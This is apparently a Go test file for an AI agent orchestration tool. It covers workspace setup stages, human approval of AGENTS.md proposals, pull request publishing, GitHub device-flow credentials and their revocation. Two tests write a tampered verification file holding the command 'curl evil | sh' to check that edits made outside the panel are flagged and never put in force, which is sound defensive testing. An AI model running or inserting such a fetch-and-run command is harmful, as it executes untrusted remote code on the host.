package app

import (
	"bytes"
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/mestre-ia/mestre/internal/classes"
	"github.com/mestre-ia/mestre/internal/github"
	"github.com/mestre-ia/mestre/internal/gitx"
	"github.com/mestre-ia/mestre/internal/orchestration/chain"
	"github.com/mestre-ia/mestre/internal/orchestration/characters"
	"github.com/mestre-ia/mestre/internal/orchestration/workspaces"
	"github.com/mestre-ia/mestre/internal/panel"
	"github.com/mestre-ia/mestre/internal/providers"
	"github.com/mestre-ia/mestre/internal/sessionzero"
	"github.com/mestre-ia/mestre/internal/telegram"
	"github.com/mestre-ia/mestre/internal/testkit/fakegit"
	"github.com/mestre-ia/mestre/internal/testkit/fakegithub"
	"github.com/mestre-ia/mestre/internal/users"
	"github.com/mestre-ia/mestre/internal/vault"
)

// szWorld is the approval world with the session zero of the workspaces composed.
type szWorld struct {
	*approvalWorld
	zero *sessionzero.Service
}

func newSZWorld(t *testing.T) *szWorld {
	t.Helper()
	w := &szWorld{approvalWorld: newApprovalWorld(t)}
	var err error
	w.zero, err = w.run.SessionZero(w.orc, sessionzero.Worktree{Providers: providers.NewRegistry(providers.Options{NoFlush: true}), Binary: "/usr/local/bin/mestre"})
	if err != nil {
		t.Fatal(err)
	}
	return w
}

// installIn puts an App (by slug) in another repository of the account.
func (w *szWorld) installIn(slug, repo string) {
	w.gh.AddInstalledRepo(slug, repo, true)
}

const (
	gmSlug     = "lucas-mestre-grao-mestre"
	mestreSlug = "lucas-mestre-mestre"
)

// Part of CA-SZ-WS-02 (the production composition): a workspace of a repository without the
// Apps waits at the stage apps, with no error; installed, it goes on alone. Without
// a Grand Master the stage files stops saying so, and the analysis stops saying it
// needs the agent.
func TestTheStagesOfTheSessionZeroRunInTheCitadelAndStopWhereTheyNeedWhatIsNotHere(t *testing.T) {
	t.Parallel()
	w := newSZWorld(t)
	w.gh.AddRepo("lucas", "outro")
	w.installIn(gmSlug, "lucas/outro")
	ws, err := w.orc.Workspaces.Create(w.ctx, workspaces.CreateRequest{Repo: "lucas/Outro"})
	if err != nil {
		t.Fatal(err)
	}
	var we *workspaces.WaitError
	if err := w.orc.Workspaces.Prepare(w.ctx, ws.Slug); !errors.As(err, &we) {
		t.Fatalf("Prepare with an App missing = %v, want the wait of the stage apps", err)
	}
	if got, _ := w.orc.Workspaces.Get(w.ctx, ws.Slug); got.Stage != workspaces.StageApps || got.StageFailure != nil {
		t.Fatalf("workspace at %q with failure %v, want waiting at apps with no error", got.Stage, got.StageFailure)
	}
	w.installIn(mestreSlug, "lucas/outro")
	w.clk.Advance(sessionzero.AppsPoll)
	_ = w.orc.Workspaces.Prepare(w.ctx, ws.Slug)
	got, _ := w.orc.Workspaces.Get(w.ctx, ws.Slug)
	if got.Stage != workspaces.StageFiles || got.StageFailure == nil || got.StageFailure.Code != "grand_master_failed" {
		t.Fatalf("workspace at %q with failure %+v, want the stage files failing for lack of a Grand Master", got.Stage, got.StageFailure)
	}
	if _, err := w.orc.Characters.Create(w.ctx, characters.CreateRequest{Sheet: "Grão-Mestre", Workspace: ws.Slug, Role: characters.RoleGrandMaster, Creator: characters.Creator{Kind: characters.CreatedByEngine}}); err != nil {
		t.Fatal(err)
	}
	_ = w.orc.Workspaces.Prepare(w.ctx, ws.Slug)
	got, _ = w.orc.Workspaces.Get(w.ctx, ws.Slug)
	if got.Stage != workspaces.StageAnalysis || got.StageFailure == nil || got.StageFailure.Code != "analysis_failed" || !strings.Contains(got.StageFailure.Reason, "agent") {
		t.Fatalf("workspace at %q with failure %+v, want the analysis failing because it needs the agent", got.Stage, got.StageFailure)
	}
	if st, err := os.Stat(filepath.Join(w.orc.Workspaces.Layout().Principal(ws.Slug), ".mestre", "regras")); err != nil || !st.IsDir() {
		t.Errorf("the stage files left no .mestre/regras in the main clone: %v", err)
	}
}

// Part of CA-SZ-WS-06 and CA-GH-APROV-01 over the production composition: the stage
// approval_test reads the rules and the review of the App "Grão-Mestre" decides.
func TestTheApprovalTestOfTheSessionZeroRecordsWhetherTheReviewOfTheAppCounts(t *testing.T) {
	t.Parallel()
	for _, counts := range []bool{true, false} {
		w := newSZWorld(t)
		w.gh.SetBranchRules("lucas/meu_app", "main", fakegithub.Rule{Type: "pull_request", Parameters: map[string]any{"required_approving_review_count": 1}})
		w.gh.SetAppReviewsCount("lucas/meu_app", counts)
		if err := w.zero.RunApprovalTest(w.ctx, w.ws.Slug); err != nil {
			t.Fatalf("counts=%v: %v", counts, err)
		}
		st, err := w.zero.State(w.ctx, w.ws.Slug)
		if want := map[bool]string{true: sessionzero.ResultCounts, false: sessionzero.ResultDoesNotCount}[counts]; err != nil || st.ApprovalTest != want {
			t.Errorf("counts=%v: result = %q, %v; want %q", counts, st.ApprovalTest, err, want)
		}
	}
}

// The proposal of AGENTS.md goes to the people as a request of the chain; what they
// answer reaches the session zero. (The pull request that follows an approval is
// built with the real tool of versioning, in internal/sessionzero; here the double
// cannot stage files, so only the decision is proven, and Publish has its own test.)
func TestTheAgentsMDProposalIsDecidedByThePeopleAndTheDecisionReachesTheSessionZero(t *testing.T) {
	t.Parallel()
	const text = "# Meu app\n\nGo.\n"
	for _, approve := range []bool{true, false} {
		w := newSZWorld(t)
		id, err := szApprovals{r: w.run, orc: w.orc}.RequestAgentsMD(w.ctx, w.ws.Slug, text)
		if err != nil {
			t.Fatal(err)
		}
		rq, err := w.orc.Chain.Get(w.ctx, mustID(t, id))
		if err != nil || rq.Type != classes.RequestAgentsMD || rq.Task != text || strings.Contains(rq.About, text) || !bytes.Equal(rq.Target, agentsMDTarget(w.ws.Slug, text)) {
			t.Fatalf("request = %+v, %v; want a short About, the text in the agent block and the target bound to its hash", rq, err)
		}
		if err := (sessionzero.Store{DB: w.db}).AgentsMDProposed(w.ctx, w.ws.Slug, w.clk.Now(), id, text); err != nil {
			t.Fatal(err)
		}
		answer := chain.AnswerDeny
		if approve {
			answer = chain.AnswerApprove
		}
		if _, err := w.orc.Chain.DecideByPerson(w.ctx, chain.PersonDecision{Request: mustID(t, id), User: w.owner.ID, Level: string(users.Owner), Answer: answer}); err != nil {
			t.Fatal(err)
		}
		st, err := w.zero.State(w.ctx, w.ws.Slug)
		want := sessionzero.AgentsMDRejected
		if approve {
			want = sessionzero.AgentsMDApproved
		}
		if err != nil || st.AgentsMD != want {
			t.Errorf("approve=%v: state %q, %v; want %q", approve, st.AgentsMD, err, want)
		}
	}
}

// What the people approve is the text that was hashed: if the text held by the
// session zero is no longer the one of the request, the approval changes nothing.
func TestAnApprovedAgentsMDWhoseTextChangedAfterTheRequestIsNotSent(t *testing.T) {
	t.Parallel()
	w := newSZWorld(t)
	id, err := szApprovals{r: w.run, orc: w.orc}.RequestAgentsMD(w.ctx, w.ws.Slug, "# o texto aprovado\n")
	if err != nil {
		t.Fatal(err)
	}
	if err := (sessionzero.Store{DB: w.db}).AgentsMDProposed(w.ctx, w.ws.Slug, w.clk.Now(), id, "# outro texto, trocado depois\n"); err != nil {
		t.Fatal(err)
	}
	// the sink refuses (the chain logs it): the state is what proves nothing was taken
	_, _ = w.orc.Chain.DecideByPerson(w.ctx, chain.PersonDecision{Request: mustID(t, id), User: w.owner.ID, Level: string(users.Owner), Answer: chain.AnswerApprove})
	st, _ := w.zero.State(w.ctx, w.ws.Slug)
	if st.AgentsMD != sessionzero.AgentsMDProposed || st.PRURL != "" || len(w.remote.Pushes()) != 0 {
		t.Fatalf("state %q, PR %q, pushes %v; want nothing sent", st.AgentsMD, st.PRURL, w.remote.Pushes())
	}
}

// The pull request of the session zero: the branch the engine built goes out with a
// token of the App "Grão-Mestre" and is opened once, however many times it is sent.
func TestThePullRequestOfTheSessionZeroIsSentWithTheGrandMasterAppAndOpenedOnce(t *testing.T) {
	t.Parallel()
	w := newSZWorld(t)
	mirror, err := w.orc.Workspaces.OpenMirror(w.ctx, w.ws.Slug)
	if err != nil {
		t.Fatal(err)
	}
	h, ok := mirror.(*fakegit.Handle)
	if !ok {
		t.Fatalf("the mirror is a %T", mirror)
	}
	h.Data().Commit(sessionzero.PRBranch, "chore: add the Mestre session zero files", map[string]string{"AGENTS.md": "# Meu app\n"})
	pr := sessionzero.PullRequest{Workspace: w.ws.Slug, Repo: w.ws.Repo, Branch: sessionzero.PRBranch, Base: "main", Title: "Sessão zero do Mestre", Body: "arquivos"}
	// GitHub says what the remote has (the doubles are two worlds)
	remoteHead := func(context.Context, string, string) (string, error) {
		h, err := w.remote.Handle(w.rdir).Data().Resolve("refs/heads/" + sessionzero.PRBranch)
		if err != nil {
			return "", github.ErrNotFound
		}
		return string(h), nil
	}
	pub := szPullRequests{r: w.run, orc: w.orc, head: remoteHead}
	first, err := pub.Publish(w.ctx, pr)
	if err != nil || first == "" {
		t.Fatalf("Publish = %q, %v", first, err)
	}
	again, err := pub.Publish(w.ctx, pr) // the branch is rebuilt and sent again: still one pull request
	if err != nil || again != first {
		t.Fatalf("second Publish = %q, %v; want the same pull request %q", again, err, first)
	}
	if p := w.remote.Pushes(); len(p) != 2 || !strings.HasSuffix(p[0], sessionzero.PRBranch+":refs/heads/"+sessionzero.PRBranch+" lease:") || !strings.Contains(p[1], sessionzero.PRBranch+" lease:") || strings.Contains(p[1], " force") {
		t.Errorf("pushes = %q, want the branch of the session zero, twice", p)
	}
	if _, open, err := openSessionZeroPR(w); err != nil || !open {
		t.Errorf("open PR = %v, %v", open, err)
	}
	if sig, err := pub.Author(w.ctx); err != nil || sig.Name == "" || sig.Email == "" {
		t.Errorf("author = %+v, %v; want the identity of the App Grão-Mestre", sig, err)
	}
	// someone pushed to the branch after it was read: the lease refuses, and what
	// they pushed stays
	read, err := remoteHead(w.ctx, "", "")
	if err != nil {
		t.Fatal(err)
	}
	other := w.remote.Handle(w.rdir).Data().Commit(sessionzero.PRBranch, "someone else", map[string]string{"x": "y"})
	stale := szPullRequests{r: w.run, orc: w.orc, head: func(context.Context, string, string) (string, error) { return read, nil }}
	if _, err := stale.Publish(w.ctx, pr); !errors.Is(err, gitx.ErrPushRejected) {
		t.Errorf("Publish over a branch that moved = %v; want ErrPushRejected", err)
	}
	if now, _ := remoteHead(w.ctx, "", ""); now != string(other) {
		t.Errorf("the branch is %s; the push overwrote the commit of the other (%s)", now, other)
	}
	// without the lease of the epoch nothing goes out
	w.run.fence.Store(nil)
	if _, err := pub.Publish(w.ctx, pr); err == nil {
		t.Error("Publish went out without the fence")
	}
}

func mustID(t *testing.T, s string) int64 {
	t.Helper()
	var n int64
	for _, c := range s {
		n = n*10 + int64(c-'0')
	}
	return n
}

func openSessionZeroPR(w *szWorld) (github.PullData, bool, error) {
	return w.run.gmRest(w.run.gmApp(w.ctx), pullPushPermissions).OpenPullOf(w.ctx, "lucas/meu_app", sessionzero.PRBranch, "main")
}

// A request of the type proposta_agents_md that is not the one the session zero
// recorded (a character asked it, or a stale one) changes nothing.
func TestARequestOfAgentsMDThatIsNotTheRecordedProposalChangesNothing(t *testing.T) {
	t.Parallel()
	w := newSZWorld(t)
	if err := (sessionzero.Store{DB: w.db}).AgentsMDProposed(w.ctx, w.ws.Slug, w.clk.Now(), "9999", "# real\n"); err != nil {
		t.Fatal(err)
	}
	id, err := w.orc.Chain.Request(w.ctx, chain.OpenRequest{Type: classes.RequestAgentsMD, Workspace: w.ws.Slug, About: "outro texto"})
	if err != nil {
		t.Fatal(err)
	}
	_, _ = w.orc.Chain.DecideByPerson(w.ctx, chain.PersonDecision{Request: id, User: w.owner.ID, Level: string(users.Owner), Answer: chain.AnswerApprove})
	st, _ := w.zero.State(w.ctx, w.ws.Slug)
	if st.AgentsMD != sessionzero.AgentsMDProposed || st.PRURL != "" {
		t.Fatalf("state %q, PR %q; want the proposal still waiting", st.AgentsMD, st.PRURL)
	}
	if _, open, _ := openSessionZeroPR(w); open || len(w.remote.Pushes()) != 0 {
		t.Fatal("a pull request was sent for a request that is not the proposal")
	}
}

// ---- the personal credential: /github and Remove ----

// telegramWorld is the world with the bot made (the channel of /github is bound).
func (w *szWorld) withBot() {
	w.t.Helper()
	if err := w.vault.Put(w.ctx, TelegramTokenSecret, vault.TypeTelegramBotToken, []byte("123456:fake-bot-token"), nil); err != nil {
		w.t.Fatal(err)
	}
	if _, err := w.run.startBot(w.ctx); err != nil {
		w.t.Fatal(err)
	}
}

// member makes an Administrator of the workspace with the login given.
func (w *szWorld) member(name, login string, level users.Level, workspaces ...string) users.User {
	w.t.Helper()
	u, err := w.run.users.Create(w.ctx, w.owner, users.NewUser{Name: name, Level: level, Workspaces: workspaces})
	if err != nil {
		w.t.Fatal(err)
	}
	if u, err = w.run.users.Edit(w.ctx, w.owner, u.ID, users.Edit{GitHubLogin: &login}); err != nil {
		w.t.Fatal(err)
	}
	return u
}

func (w *szWorld) outbox() string {
	rows, err := w.db.Reader().QueryContext(w.ctx, `SELECT params FROM telegram_outbox ORDER BY id`)
	if err != nil {
		w.t.Fatal(err)
	}
	defer rows.Close()
	var all []string
	for rows.Next() {
		var p string
		if err := rows.Scan(&p); err != nil {
			w.t.Fatal(err)
		}
		all = append(all, p)
	}
	return strings.Join(all, "\n")
}

func (w *szWorld) github(u users.User) (string, error) {
	return w.run.gh.Commands()[0].Run(w.ctx, telegram.Call{User: u, ChatID: 4242})
}

// connecting sends /github and waits until the wait for the authorization is armed
// on the clock of the test.
func (w *szWorld) connecting(u users.User) string {
	w.t.Helper()
	before := w.clk.Armed()
	said, err := w.github(u)
	if err != nil {
		w.t.Fatal(err)
	}
	w.clk.BlockUntil(before + 1)
	return said
}

func (w *szWorld) status(u users.User) string {
	w.t.Helper()
	st, err := w.run.Personal().Status(w.ctx, u.ID)
	if err != nil {
		w.t.Fatal(err)
	}
	return st.State
}

// Part of CA-GH-APROV-06 by the bot: the user is shown the code and the address, the
// engine asks at the pace of GitHub with the injectable clock, and the credential
// is kept when the account is the registered one. No token reaches the chat.
func TestGitHubCommandOfTheBotConnectsTheCredentialByTheDeviceFlow(t *testing.T) {
	t.Parallel()
	w := newSZWorld(t)
	w.withBot()
	ana := w.member("Ana", "ana-gh", users.Administrator, w.ws.Slug)
	said := w.connecting(ana)
	code := between(said, "código ", " (")
	if code == "" || !strings.Contains(said, "/login/device") && !strings.Contains(said, "http") {
		t.Fatalf("answer = %q, want the address and the code", said)
	}
	if w.status(ana) != "" {
		t.Fatal("the credential exists before the authorization")
	}
	w.gh.AuthorizeDevice(code, "ana-gh")
	w.clk.Advance(30 * time.Second)
	w.run.gh.Wait()
	if got := w.status(ana); got != github.CredentialConnected {
		t.Fatalf("credential = %q, want connected", got)
	}
	out := w.outbox()
	if !strings.Contains(out, "GitHub conectado") {
		t.Errorf("the user was not told it is connected: %s", out)
	}
	for _, secret := range []string{"client-secret-gm", "ghu_"} {
		if strings.Contains(out, secret) {
			t.Errorf("the chat has %q", secret)
		}
	}
}

func TestGitHubCommandRefusesWhoActsInNoWorkspaceAndTellsWhatGitHubRefused(t *testing.T) {
	t.Parallel()
	w := newSZWorld(t)
	w.withBot()
	// an Approver in no workspace
	bia := w.member("Bia", "bia-gh", users.Approver)
	said, err := w.github(bia)
	if err != nil || !strings.Contains(said, "nenhuma campanha") {
		t.Fatalf("answer = %q, %v; want the refusal for acting in no workspace", said, err)
	}
	// a user with no github_login
	cris := w.member("Cris", "", users.Administrator, w.ws.Slug)
	if said, _ = w.github(cris); !strings.Contains(said, "login do GitHub") {
		t.Fatalf("answer = %q, want the missing login", said)
	}
	// the account that authorizes is not the registered one: nothing is kept
	dan := w.member("Dan", "dan-gh", users.Administrator, w.ws.Slug)
	said = w.connecting(dan)
	w.gh.AuthorizeDevice(between(said, "código ", " ("), "someone-else")
	w.clk.Advance(30 * time.Second)
	w.run.gh.Wait()
	if w.status(dan) != "" || !strings.Contains(w.outbox(), "não é a cadastrada") {
		t.Fatalf("credential %q; outbox %q; want nothing kept and the user told", w.status(dan), w.outbox())
	}
}

// Part of CA-GH-APROV-06, the end of the credential: when the user is removed or loses
// what connecting needs, his token goes out of the vault and is revoked.
func TestThePersonalCredentialIsRemovedWhenTheUserIsRemovedOrLosesTheLevelThatNeedsIt(t *testing.T) {
	t.Parallel()
	connect := func(w *szWorld, u users.User) {
		t.Helper()
		ch, err := w.run.Personal().Begin(w.ctx, u.ID)
		if err != nil {
			t.Fatal(err)
		}
		w.gh.AuthorizeDevice(ch.UserCode, u.GitHubLogin)
		w.clk.Advance(ch.Interval)
		if res, err := w.run.Personal().Poll(w.ctx, u.ID); err != nil || res != github.PollConnected {
			t.Fatalf("connect = %q, %v", res, err)
		}
	}
	level := func(l users.Level) users.Edit { return users.Edit{Level: &l} }
	none := []string{}
	cases := []struct {
		name string
		do   func(w *szWorld, u users.User) error
		gone bool
	}{
		{"removed", func(w *szWorld, u users.User) error { return w.run.users.Remove(w.ctx, w.owner, u.ID) }, true},
		{"suspended", func(w *szWorld, u users.User) error { return w.run.users.Suspend(w.ctx, w.owner, u.ID) }, true},
		{"becomes an Observer", func(w *szWorld, u users.User) error {
			_, err := w.run.users.Edit(w.ctx, w.owner, u.ID, level(users.Observer))
			return err
		}, true},
		{"acts in no workspace", func(w *szWorld, u users.User) error {
			_, err := w.run.users.Edit(w.ctx, w.owner, u.ID, users.Edit{Workspaces: &none})
			return err
		}, true},
		{"goes down to Approver", func(w *szWorld, u users.User) error {
			_, err := w.run.users.Edit(w.ctx, w.owner, u.ID, level(users.Approver))
			return err
		}, false},
	}
	for _, c := range cases {
		w := newSZWorld(t)
		u := w.member("Ana", "ana-gh", users.Administrator, w.ws.Slug)
		connect(w, u)
		if w.status(u) != github.CredentialConnected {
			t.Fatalf("%s: not connected", c.name)
		}
		if err := c.do(w, u); err != nil {
			t.Fatalf("%s: %v", c.name, err)
		}
		got := w.status(u)
		if c.gone && (got != "" || len(w.gh.RevokedTokens()) == 0) {
			t.Errorf("%s: credential %q, revoked %v; want it erased and the grant revoked", c.name, got, w.gh.RevokedTokens())
		}
		if !c.gone && got != github.CredentialConnected {
			t.Errorf("%s: credential %q, want it kept (he still connects)", c.name, got)
		}
		if c.gone {
			if err := w.vault.Use(w.ctx, github.UserTokenSecret(u.ID), "test", func([]byte) error { return nil }); !errors.Is(err, vault.ErrNotFound) {
				t.Errorf("%s: the token is still in the vault: %v", c.name, err)
			}
		}
	}
}

func between(s, a, b string) string {
	_, rest, ok := strings.Cut(s, a)
	if !ok {
		return ""
	}
	v, _, _ := strings.Cut(rest, b)
	return v
}

func TestThePushCredentialIsForTheConfiguredGitHubWeb(t *testing.T) {
	t.Parallel()
	r := &stdRun{}
	if got := r.gitWeb(); got != DefaultGitHubWeb {
		t.Errorf("default = %q", got)
	}
	r.s.GitHubWeb = "https://github.example.com/"
	if got := r.gitWeb(); got != "https://github.example.com" {
		t.Errorf("configured = %q", got)
	}
}

// CA-WSP-01 (the part of the server).
// The Grand Master of a workspace is started by the stage files with the sheet the
// panel chose when the workspace was created (docs/painel/administracao.md): a
// sheet that does not exist is refused before the workspace exists, and a created
// workspace keeps the choice for the stage.
func TestTheWorkspaceCreatedInThePanelKeepsTheSheetOfItsGrandMaster(t *testing.T) {
	t.Parallel()
	w := newSZWorld(t)
	h := workspaceHost{w.run}
	sheets, err := h.Sheets(w.ctx)
	if err != nil || len(sheets) == 0 {
		t.Fatalf("sheets %+v, %v: the world has none", sheets, err)
	}
	w.gh.AddRepo("lucas", "novo")
	_, err = h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: "nao-existe"})
	var ref *panel.Refusal
	if !errors.As(err, &ref) || ref.Reason != "unknown_sheet" {
		t.Fatalf("an unknown sheet = %v, want the refusal unknown_sheet", err)
	}
	before, _ := w.orc.Workspaces.List(w.ctx)
	if len(before) != 1 { // the one of the world
		t.Fatalf("the world has %d workspaces", len(before))
	}
	if after, _ := w.orc.Workspaces.List(w.ctx); len(after) != len(before) {
		t.Fatalf("the refused creation left %d workspaces", len(after))
	}
	row, err := h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: sheets[0].Name})
	if err != nil {
		t.Fatal(err)
	}
	if st, err := w.zero.State(w.ctx, row.Slug); err != nil || st.GrandMasterSheet != sheets[0].Name {
		t.Errorf("the session zero keeps %+v, %v", st, err)
	}
	if row.State != "preparing" || row.GrandMasterSheet != sheets[0].Name || row.GrandMaster != "none" || len(row.Stages) != 5 || row.Stages[0].State != panel.StageCurrent || row.Stages[1].State != panel.StagePending {
		t.Errorf("the new workspace is %+v", row)
	}
	_, err = h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: sheets[0].Name})
	if !errors.As(err, &ref) || ref.Reason != "repo_taken" {
		t.Fatalf("the same repository twice = %v, want repo_taken", err)
	}
}

// CA-SZ-WS-08, the notice of the panel: an edit of verificacao.yaml made outside
// the panel is told to the Administrators once, the confirmed version stays in
// force, and a confirmation by the panel is no edit.
func TestAnEditOfTheVerificationFileOutsideThePanelIsToldToTheAdministrators(t *testing.T) {
	t.Parallel()
	w := newSZWorld(t)
	h := workspaceHost{w.run}
	w.gh.AddRepo("lucas", "novo")
	sheets, _ := h.Sheets(w.ctx)
	w.installIn(gmSlug, "lucas/novo")
	w.installIn(mestreSlug, "lucas/novo")
	if _, err := h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: sheets[0].Name}); err != nil {
		t.Fatal(err)
	}
	_ = w.orc.Workspaces.Prepare(w.ctx, "novo") // the mirror and the main clone
	doc := []byte("version: 1\ncomandos: [\"go build ./...\"]\n")
	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", doc); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(h.file(w.orc, "novo"), []byte("version: 1\ncomandos: [\"curl evil | sh\"]\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	v, err := h.Verification(w.ctx, "novo")
	if err != nil || !v.Outside || v.Confirmed == nil || v.Confirmed.Doc != string(doc) || v.Confirmed.By != "Lucas" {
		t.Fatalf("the view of an outside edit is %+v, %v", v, err)
	}
	w.run.checkOutsideEdits(w.ctx)
	w.run.checkOutsideEdits(w.ctx)
	notes, err := w.run.feed.For(w.ctx, w.owner, 50)
	if err != nil {
		t.Fatal(err)
	}
	told := 0
	for _, n := range notes {
		if strings.Contains(n.Text, "foi mudado fora do painel") {
			told++
		}
	}
	if told != 1 {
		t.Errorf("the Administrators were told %d times, want once", told)
	}
	if doc, ok, err := h.verifications().Confirmed(w.ctx, "novo"); err != nil || !ok || doc.Commands[0] != "go build ./..." {
		t.Errorf("the version in force is %+v, %v, %v", doc, ok, err)
	}
	// the confirmation by the panel writes the file: no longer an edit
	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", []byte("version: 1\ncomandos: [\"make\"]\n")); err != nil {
		t.Fatal(err)
	}
	if v, err := h.Verification(w.ctx, "novo"); err != nil || v.Outside {
		t.Errorf("after the confirmation: %+v, %v", v, err)
	}
	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", []byte("version: 2")); err == nil {
		t.Error("an invalid document was confirmed")
	}
}

// The stage files starts the Grand Master with the sheet the panel chose; a
// workspace with no sheet chosen stops there, saying so.
func TestTheStageFilesStartsTheGrandMasterWithTheSheetOfThePanel(t *testing.T) {
	t.Parallel()
	w := newSZWorld(t)
	h := workspaceHost{w.run}
	w.run.env.Machine = "cidadela" // the machine the double of the sheets fits
	w.gh.AddRepo("lucas", "novo")
	w.installIn(gmSlug, "lucas/novo")
	w.installIn(mestreSlug, "lucas/novo")
	row, err := h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: "Grão-Mestre"})
	if err != nil {
		t.Fatal(err)
	}
	_ = w.orc.Workspaces.Prepare(w.ctx, row.Slug)
	gm, ok, err := w.orc.Registry.GrandMaster(w.ctx, row.Slug)
	if err != nil || !ok || gm.Sheet != "Grão-Mestre" || gm.Role != characters.RoleGrandMaster {
		got, _ := w.orc.Workspaces.Get(w.ctx, row.Slug)
		t.Fatalf("Grand Master %+v (alive %v, %v); the workspace is at %q with %+v", gm, ok, err, got.Stage, got.StageFailure)
	}
	if got, _ := w.orc.Workspaces.Get(w.ctx, row.Slug); got.Stage == workspaces.StageFiles && got.StageFailure != nil && got.StageFailure.Code == "grand_master_failed" {
		t.Errorf("the stage files still fails: %+v", got.StageFailure)
	}
}

// A verificacao.yaml that is a link (or a folder, a pipe, a file too big) is not read:
// the screen says so instead of failing, the Administrators are told once as for an
// edit outside the panel, and a confirmation still holds and makes the file right.
func TestAVerificationFileThatIsALinkDoesNotBlockTheScreenOrTheConfirmation(t *testing.T) {
	t.Parallel()
	w := newSZWorld(t)
	h := workspaceHost{w.run}
	w.gh.AddRepo("lucas", "novo")
	sheets, _ := h.Sheets(w.ctx)
	w.installIn(gmSlug, "lucas/novo")
	w.installIn(mestreSlug, "lucas/novo")
	if _, err := h.Create(w.ctx, w.owner, panel.CreateWorkspaceRequest{Repo: "lucas/novo", GrandMasterSheet: sheets[0].Name}); err != nil {
		t.Fatal(err)
	}
	_ = w.orc.Workspaces.Prepare(w.ctx, "novo")
	doc := []byte("version: 1\ncomandos: [\"go build ./...\"]\n")
	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", doc); err != nil {
		t.Fatal(err)
	}
	file := h.file(w.orc, "novo")
	target := filepath.Join(t.TempDir(), "alvo.yaml")
	if err := os.WriteFile(target, []byte("version: 1\ncomandos: [\"curl evil | sh\"]\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(file); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, file); err != nil {
		t.Skip("no symbolic links here:", err)
	}
	v, err := h.Verification(w.ctx, "novo")
	if err != nil || v.FileError == "" || !v.Outside || v.Confirmed == nil || v.Confirmed.Doc != string(doc) {
		t.Fatalf("the view of a link is %+v, %v", v, err)
	}
	w.run.checkOutsideEdits(w.ctx)
	w.run.checkOutsideEdits(w.ctx)
	notes, _ := w.run.feed.For(w.ctx, w.owner, 50)
	told := 0
	for _, n := range notes {
		if strings.Contains(n.Text, "foi mudado fora do painel") {
			told++
		}
	}
	if told != 1 {
		t.Errorf("the Administrators were told %d times, want once", told)
	}
	// the confirmation holds even if the file cannot be written
	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", []byte("version: 1\ncomandos: [\"make\"]\n")); err != nil {
		t.Fatalf("a link blocked the confirmation: %v", err)
	}
	if c, ok, _ := h.verifications().Confirmation(w.ctx, "novo"); !ok || !strings.Contains(c.Doc, "make") {
		t.Errorf("the confirmation is %+v", c)
	}
}

// fakeAnalyst is the Grand Master analysing a Go project.
type fakeAnalyst struct{}

func (fakeAnalyst) Analyze(context.Context, sessionzero.AnalysisInput) (sessionzero.Analysis, error) {
	return sessionzero.Analysis{Summary: "Go", ProposedAgentsMD: "# Projeto\n", Verification: []string{"go build ./...", "go test ./..."}}, nil
}

// CA-SZ-WS-08: when the stage analysis ends, verificacao.yaml of the main clone holds the proposal
// (go build and go test) and no version is in force until an Administrator confirms it.
func TestTheAnalysisLeavesTheVerificationProposalAndNothingHoldsBeforeTheConfirmation(t *testing.T) {
	t.Parallel()
	w := &szWorld{approvalWorld: newApprovalWorld(t)}
	w.run.analyst = fakeAnalyst{}
	var err error
	w.zero, err = w.run.SessionZero(w.orc, sessionzero.Worktree{Providers: providers.NewRegistry(providers.Options{NoFlush: true}), Binary: "/usr/local/bin/mestre"})
	if err != nil {
		t.Fatal(err)
	}
	h := workspaceHost{w.run}
	w.gh.AddRepo("lucas", "novo")
	w.installIn(gmSlug, "lucas/novo")
	w.installIn(mestreSlug, "lucas/novo")
	if _, err := w.orc.Workspaces.Create(w.ctx, workspaces.CreateRequest{Repo: "lucas/novo"}); err != nil {
		t.Fatal(err)
	}
	_ = w.orc.Workspaces.Prepare(w.ctx, "novo")
	if _, err := w.orc.Characters.Create(w.ctx, characters.CreateRequest{Sheet: "Grão-Mestre", Workspace: "novo", Role: characters.RoleGrandMaster, Creator: characters.Creator{Kind: characters.CreatedByEngine}}); err != nil {
		t.Fatal(err)
	}
	_ = w.orc.Workspaces.Prepare(w.ctx, "novo")
	got, _ := w.orc.Workspaces.Get(w.ctx, "novo")
	if got.StageFailure != nil && got.StageFailure.Code == "analysis_failed" || got.StageFailure != nil && got.StageFailure.Code == "verification_proposal_failed" {
		t.Fatalf("the analysis failed: %+v", got.StageFailure)
	}
	data, err := os.ReadFile(h.file(w.orc, "novo"))
	if err != nil {
		t.Fatalf("the proposal was not written (stage %q, failure %+v): %v", got.Stage, got.StageFailure, err)
	}
	if !strings.Contains(string(data), "go build ./...") || !strings.Contains(string(data), "go test ./...") {
		t.Errorf("the proposal is %q", data)
	}
	if _, ok, err := h.verifications().Confirmed(w.ctx, "novo"); err != nil || ok {
		t.Errorf("a version holds before the confirmation: %v, %v", ok, err)
	}
	if _, err := h.ConfirmVerification(w.ctx, w.owner, "novo", data); err != nil {
		t.Fatal(err)
	}
	if doc, ok, err := h.verifications().Confirmed(w.ctx, "novo"); err != nil || !ok || len(doc.Commands) != 2 {
		t.Errorf("after the confirmation: %+v, %v, %v", doc, ok, err)
	}
}
